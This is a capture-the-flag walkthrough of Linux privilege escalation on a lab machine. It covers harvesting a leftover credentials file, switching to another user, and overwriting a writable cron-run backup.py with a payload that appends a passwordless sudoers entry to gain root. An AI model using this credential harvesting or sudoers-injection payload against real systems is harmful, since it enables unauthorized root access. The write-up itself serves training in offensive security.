# Methodology - Privesc Linux - 2

## 1. Initial Access
```bash
ssh ctfplayer@<IP_MACHINE>
# password: ctfplayer2026
```

Observed hostname: `ip-172-16-9-243`

## 2. Initial Enumeration
```bash
ls -la ~
# Hidden files and directories identified, including .config
```

Navigate to the credentials directory:
```bash
ls -la ~/.config/app/
# Hidden file: .credentials.bak
```

Read the file:
```bash
cat ~/.config/app/.credentials.bak
```

**Relevant content:**
```
# Service: servidor-interno
# User: sysadmin
# Password: S3********
# TODO: migrate to vault
```

## 3. Lateral Movement
```bash
su sysadmin
# Password: (obtained from .credentials.bak)
cd ~
ls
cat user.txt
# User flag: hackingclub{l4t...}
```

Analyze `notes.txt`:
```bash
cat notes.txt
```

**Listed tasks:**
- [x] Configure automatic backup
- [ ] Review permissions of scripts in `/opt/scripts`
- [ ] Verify if cron is running (check `/var/log/backup.log`)
- [ ] Remove hardcoded credentials

**Important:** The backup runs automatically. Do not modify without notifying the team.

## 4. Privilege Enumeration (sysadmin)
Check the backup script:
```bash
ls -la /opt/scripts/
# backup.py (likely executed via cron as root or with elevated permissions)
```

Check logs and cron:
```bash
cat /var/log/backup.log
crontab -l
# or
ls -la /etc/cron*
```

## 5. Exploitation - Cron Job Abuse
The script `/opt/scripts/backup.py` is executed periodically via cron (approximately every 1 minute).

**Vector:** Modify the content of `backup.py` to add `sysadmin` to sudoers.

Backup the original script (recommended):
```bash
cp /opt/scripts/backup.py /tmp/backup.py.bak
```

Replace the content:
```python
import os
os.system("echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
```

```bash
# Write the payload to the file (if write permission is available)
echo 'import os
os.system("echo '\''sysadmin ALL=(ALL) NOPASSWD:ALL'\'' >> /etc/sudoers")' > /opt/scripts/backup.py
```

Wait for cron execution (~1 minute) and verify:
```bash
sudo -l
sudo su
whoami
# root
```

## 6. Capture Root Flag
```bash
cat /root/root.txt
# Root flag: hackingclub{cr0t...}
```

## Additional Recommended Enumeration Commands
```bash
find / -writable 2>/dev/null
find /opt -type f -ls 2>/dev/null
ps aux | grep -i cron
ls -la /opt/scripts/
cat /etc/crontab
```
